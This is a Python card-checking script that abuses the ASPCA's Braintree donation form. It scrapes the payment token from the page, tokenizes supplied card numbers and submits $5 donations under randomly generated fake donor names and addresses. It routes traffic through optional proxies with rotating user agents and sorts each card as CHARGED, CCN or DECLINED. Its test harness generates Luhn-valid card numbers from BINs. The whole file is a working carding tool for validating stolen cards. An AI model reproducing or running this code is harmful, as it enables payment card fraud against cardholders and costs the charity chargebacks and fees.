"""
ASPCA Braintree Checker (secure.aspca.org)
Full workflow: Load Springboard form → Extract BT token → Tokenize card → Submit $5 donation
Gateway: Braintree Hosted Fields via base64 client token (eyJ...)
"""

import asyncio
import aiohttp
import random
import string
import re
import base64
import json
import time
from fake_useragent import UserAgent
from urllib.parse import urlparse
from bin_info import bin_block_from_braintree, fetch_bin_info, format_bin_block


class BraintreeResultClassifier:
    @staticmethod
    def classify(error_text, response_text=""):
        if not error_text:
            error_text = ""
        if not response_text:
            response_text = ""
        combined = f"{error_text.lower()} {response_text.lower()}"
        if any(x in combined for x in ['success', 'thank you', 'donation complete', 'payment successful']):
            return "CHARGED", error_text or "Payment Successful"
        if 'duplicate' in combined:
            return "APPROVED", "Duplicate Transaction"
        if any(x in combined for x in ['cvv', 'cvc', 'security code']):
            if any(y in combined for y in ['incorrect', 'invalid', 'declined', 'mismatch']):
                return "CCN", "CVV Declined"
        if any(x in combined for x in ['insufficient', 'not enough', 'nsf']):
            return "INSUFFICIENT", "Insufficient Funds"
        if any(x in combined for x in ['3ds', '3-d secure', 'authentication']):
            return "APPROVED", "3DS Required"
        if any(x in combined for x in ['expired', 'expiration']):
            return "DECLINED", "Expired Card"
        if any(x in combined for x in ['invalid card', 'card number is invalid']):
            return "DECLINED", "Invalid Card Number"
        if any(x in combined for x in ['processor declined', 'do not honor']):
            return "DECLINED", "Processor Declined"
        if 'card type' in combined and 'not accepted' in combined:
            return "DECLINED", "Card Type Not Accepted"
        if any(x in combined for x in ['risk', 'fraud']):
            return "DECLINED", "Risk Declined"
        if 'gateway rejected' in combined:
            return "DECLINED", "Gateway Rejected"
        if 'transaction failed' in combined or 'payment failed' in combined:
            return "DECLINED", "Transaction Failed"
        if 'declined' in combined:
            return "DECLINED", error_text or "Declined"
        return "ERROR", error_text or "Unknown Error"


class ASPCAChecker:
    SITE_NAME = "ASPCA"
    DONATE_URL = "https://secure.aspca.org/donate/donate"
    AMOUNT = "5"

    def __init__(self):
        self.ua = UserAgent()
        self.classifier = BraintreeResultClassifier()

    def get_user_agent(self):
        return self.ua.random

    def generate_random_data(self):
        first_names = ["John", "Jane", "Michael", "Sarah", "David", "Emily", "Robert", "Lisa",
                       "James", "Mary", "William", "Patricia", "Richard", "Jennifer", "Thomas"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
                      "Rodriguez", "Martinez", "Anderson", "Taylor", "Thomas", "Moore", "Jackson"]
        streets = ["Main", "Oak", "Maple", "Cedar", "Elm", "Pine", "Park", "Lake", "Hill", "River"]
        cities_states = [
            ("New York", "NY", "10001"), ("Los Angeles", "CA", "90001"), ("Chicago", "IL", "60601"),
            ("Houston", "TX", "77001"), ("Phoenix", "AZ", "85001"), ("Philadelphia", "PA", "19101"),
            ("San Diego", "CA", "92101"), ("Dallas", "TX", "75201"), ("Denver", "CO", "80201"),
        ]
        city, state, zipcode = random.choice(cities_states)
        return {
            "first_name": random.choice(first_names),
            "last_name": random.choice(last_names),
            "email": f"{''.join(random.choices(string.ascii_lowercase, k=8))}{random.randint(10,99)}@gmail.com",
            "address": f"{random.randint(100, 9999)} {random.choice(streets)} St",
            "city": city, "state": state, "zip": zipcode, "country": "US",
        }

    async def tokenize_card(self, session, authorization, cc, mes, ano, cvv):
        headers = {
            'authorization': f'Bearer {authorization}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': self.get_user_agent(),
        }
        json_data = {
            'clientSdkMetadata': {
                'source': 'client', 'integration': 'custom',
                'sessionId': ''.join(random.choices(string.ascii_letters + string.digits, k=36))
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc, 'expirationMonth': mes.zfill(2),
                        'expirationYear': ano if len(ano) == 4 else f"20{ano}", 'cvv': cvv,
                    },
                    'options': {'validate': False}
                }
            },
            'operationName': 'TokenizeCreditCard',
        }
        try:
            async with session.post('https://payments.braintree-api.com/graphql',
                                    headers=headers, json=json_data, timeout=30) as resp:
                data = await resp.json()
                if 'data' in data and 'tokenizeCreditCard' in data['data']:
                    result = data['data']['tokenizeCreditCard']
                    return result['token'], None, result.get('creditCard', {}), (result.get('creditCard') or {}).get('binData', {})
                errors = data.get('errors', [])
                return None, (errors[0].get('message') if errors else 'Tokenization failed'), {}, {}
        except Exception as e:
            return None, str(e), {}, {}

    async def check_card(self, cc, mes, ano, cvv, proxy=None):
        card_display = f"{cc}|{mes}|{ano}|{cvv}"
        print(f"[{self.SITE_NAME}] Checking: {card_display}", flush=True)
        try:
            user_data = self.generate_random_data()
            connector = None
            if proxy:
                from aiohttp_socks import ProxyConnector
                connector = ProxyConnector.from_url(proxy)
            timeout = aiohttp.ClientTimeout(total=60)
            jar = aiohttp.CookieJar()
            headers = {
                'User-Agent': self.get_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
            }
            async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers, cookie_jar=jar) as session:
                print(f"[{self.SITE_NAME}] Loading donation page...", flush=True)
                async with session.get(self.DONATE_URL, timeout=30, allow_redirects=True) as resp:
                    if resp.status != 200:
                        return self.classifier.classify(f"Page load failed: {resp.status}")
                    html = await resp.text()
                    final_url = str(resp.url)

                form_build_id = re.search(r'name="form_build_id"\s+value="([^"]+)"', html)
                form_id = re.search(r'name="form_id"\s+value="([^"]+)"', html)
                if not form_build_id:
                    return self.classifier.classify("form_build_id not found")

                form_data = {'form_build_id': form_build_id.group(1)}
                if form_id:
                    form_data['form_id'] = form_id.group(1)
                hiddens = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html)
                hiddens += re.findall(r'<input[^>]*name="([^"]+)"[^>]*type="hidden"[^>]*value="([^"]*)"', html)
                for name, val in hiddens:
                    if name not in form_data:
                        form_data[name] = val

                bt_token = None
                prod_match = re.search(r'(production_[a-z0-9]+_[a-z0-9]+)', html)
                if prod_match:
                    bt_token = prod_match.group(1)
                else:
                    for eyj_match in re.finditer(r'["\']?(eyJ[A-Za-z0-9+/=]{50,})["\']?', html):
                        try:
                            decoded = base64.b64decode(eyj_match.group(1) + "==").decode('utf-8', errors='ignore')
                            if 'braintree' in decoded.lower() or 'authorizationFingerprint' in decoded:
                                auth_fp = re.search(r'"authorizationFingerprint":"([^"]+)"', decoded)
                                if auth_fp:
                                    bt_token = auth_fp.group(1)
                                    break
                        except:
                            pass
                if not bt_token:
                    return self.classifier.classify("Braintree token not found")
                print(f"[{self.SITE_NAME}] Extracted BT token + form data", flush=True)

                nonce, tok_error, credit_card, bin_data = await self.tokenize_card(session, bt_token, cc, mes, ano, cvv)
                if not nonce:
                    return self.classifier.classify(tok_error or "Card tokenization failed")
                print(f"[{self.SITE_NAME}] Card tokenized: {nonce[:20]}...", flush=True)
                try:
                    bin_block = await bin_block_from_braintree(credit_card, bin_data, cc=cc, session=session)
                    print(bin_block, flush=True)
                except:
                    pass

                brand_code = (credit_card.get('brandCode') or 'visa').upper()
                last4 = credit_card.get('last4', cc[-4:]) or cc[-4:]

                submit = dict(form_data)
                submit['payment_method_nonce'] = nonce
                submit['submitted[donor_information][first_name]'] = user_data['first_name']
                submit['submitted[donor_information][last_name]'] = user_data['last_name']
                submit['submitted[donor_information][mail]'] = user_data['email']
                submit['submitted[billing_information][address]'] = user_data['address']
                submit['submitted[billing_information][address_line_2]'] = ''
                submit['submitted[billing_information][city]'] = user_data['city']
                submit['submitted[billing_information][state]'] = user_data['state']
                submit['submitted[billing_information][zip]'] = user_data['zip']
                submit['submitted[billing_information][country]'] = 'US'
                submit['submitted[donation][recurs_monthly]'] = 'no_recurr'
                submit['submitted[donation][amount]'] = self.AMOUNT
                submit['submitted[donation][other_amount]'] = ''
                submit['submitted[donation_type]'] = 'one_time'
                submit['submitted[payment_information][payment_fields][credit][card_number]'] = ''
                submit['submitted[payment_information][payment_fields][credit][expiration_date]'] = ''
                submit['submitted[payment_information][payment_fields][credit][card_cvv]'] = ''
                submit['submitted[payment_information][payment_fields][credit][braintree_card_type]'] = brand_code
                submit['submitted[payment_information][payment_fields][credit][braintree_last4]'] = last4
                submit['submitted[extra_fields][payment_options]'] = 'credit'
                submit['op'] = 'Submit'

                submit_headers = {
                    'User-Agent': self.get_user_agent(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': f"{urlparse(final_url).scheme}://{urlparse(final_url).netloc}",
                    'Referer': final_url,
                }
                print(f"[{self.SITE_NAME}] Submitting donation form...", flush=True)
                async with session.post(final_url, data=submit, headers=submit_headers,
                                        allow_redirects=True, timeout=30) as resp:
                    resp_text = await resp.text()
                    resp_url = str(resp.url)
                    resp_status = resp.status
                print(f"[{self.SITE_NAME}] Response: {resp_status} -> {resp_url[:80]}", flush=True)

                text_lower = resp_text.lower()

                if 'maintenance' in text_lower or 'upgrade in progress' in text_lower or 'temporarily unavailable' in text_lower:
                    return "ERROR", "Site under maintenance - retry later"
                if resp_status >= 500:
                    return "ERROR", f"Server error (HTTP {resp_status})"

                error_msgs = re.findall(r'class="[^"]*(?:error|alert|messages--error)[^"]*"[^>]*>(.*?)</(?:div|span|li)', resp_text, re.DOTALL | re.I)
                if error_msgs:
                    cleaned = re.sub(r'<[^>]+>', '', error_msgs[0]).strip()
                    if cleaned:
                        return self.classifier.classify(cleaned, resp_text[:2000])

                if 'confirmation' in resp_url.lower() or 'thank-you' in resp_url.lower():
                    return "CHARGED", "Payment Successful - Confirmation page"
                if resp_status == 200 and 'thank you' in text_lower and ('donation' in text_lower or 'gift' in text_lower):
                    return "CHARGED", "Thank you for your donation"

                for pat, result in [
                    ('processor declined', ("DECLINED", "Processor Declined")),
                    ('do not honor', ("DECLINED", "Do Not Honor")),
                    ('cvv does not match', ("CCN", "CVV Mismatch")),
                    ('insufficient funds', ("INSUFFICIENT", "Insufficient Funds")),
                    ('card was declined', ("DECLINED", "Card Declined")),
                    ('expired card', ("DECLINED", "Expired Card")),
                    ('invalid card', ("DECLINED", "Invalid Card")),
                    ('gateway rejected', ("DECLINED", "Gateway Rejected")),
                ]:
                    if pat in text_lower:
                        return result

                return self.classifier.classify("", resp_text[:2000])
        except Exception as e:
            print(f"[{self.SITE_NAME}] Error: {str(e)}", flush=True)
            return self.classifier.classify(str(e))


if __name__ == "__main__":
    def luhn_generate(bin_prefix="411111"):
        digits = list(bin_prefix)
        while len(digits) < 15:
            digits.append(str(random.randint(0, 9)))
        total = 0
        for i, d in enumerate(reversed(digits)):
            n = int(d)
            if i % 2 == 0:
                n *= 2
                if n > 9:
                    n -= 9
            total += n
        check = (10 - (total % 10)) % 10
        digits.append(str(check))
        return ''.join(digits)

    async def test():
        checker = ASPCAChecker()
        bins = ["411111", "540133", "450761"]
        for b in bins:
            cc = luhn_generate(b)
            mes = str(random.randint(1, 12)).zfill(2)
            ano = str(random.randint(2026, 2030))
            cvv = str(random.randint(100, 999))
            print(f"\n{'='*60}", flush=True)
            print(f"Testing: {cc}|{mes}|{ano}|{cvv}", flush=True)
            result_type, result_msg = await checker.check_card(cc, mes, ano, cvv)
            print(f"RESULT: {result_type} - {result_msg}", flush=True)
            await asyncio.sleep(2)
    asyncio.run(test())
